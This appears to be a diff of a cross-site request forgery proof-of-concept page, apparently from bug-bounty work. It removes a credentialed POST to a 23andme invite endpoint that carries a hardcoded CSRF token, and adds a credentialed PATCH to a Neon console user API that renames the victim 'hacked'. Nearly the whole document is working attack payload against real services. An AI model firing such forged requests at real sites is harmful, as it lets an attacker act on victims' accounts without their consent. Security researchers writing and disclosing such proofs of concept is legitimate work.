@@ -4,30 +4,16 @@
 <h2>CSRF PoC Result:</h2>
 <pre id="result">Sending...</pre>
 <script>
-fetch("https://you.23andme.com/p/180677619c42c7dd/quick-invite/", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json",
-    "X-Csrftoken": "8m72xJaePU7YOjGZYUaM8a9UdLSidbRc",
-    "X-Requested-With": "XMLHttpRequest"
-  },
+fetch("https://console.neon.tech/api/v2/users/me", {
+  method: "PATCH",
+  credentials: "include",  // sends the victim's cookie
+  headers: { "Content-Type": "application/json" },
   body: JSON.stringify({
-    emails: ["hackx0+test2@wearehackerone.com"],
-    message: "",
-    sharing_level: "both",
-    profile_ids: ["180677619c42c7dd"],
-    relationship: "sibling"
+    id: "known-or-guessed-id",
+    first_name: "hacked",
+    last_name: "hacked"
   })
 })
-.then(r => {
-  document.getElementById("result").textContent = 
-    "Status: " + r.status + " " + r.statusText;
-})
-.catch(e => {
-  document.getElementById("result").textContent = 
-    "Error: " + e.message;
-});
 </script>
 </body>
 </html>
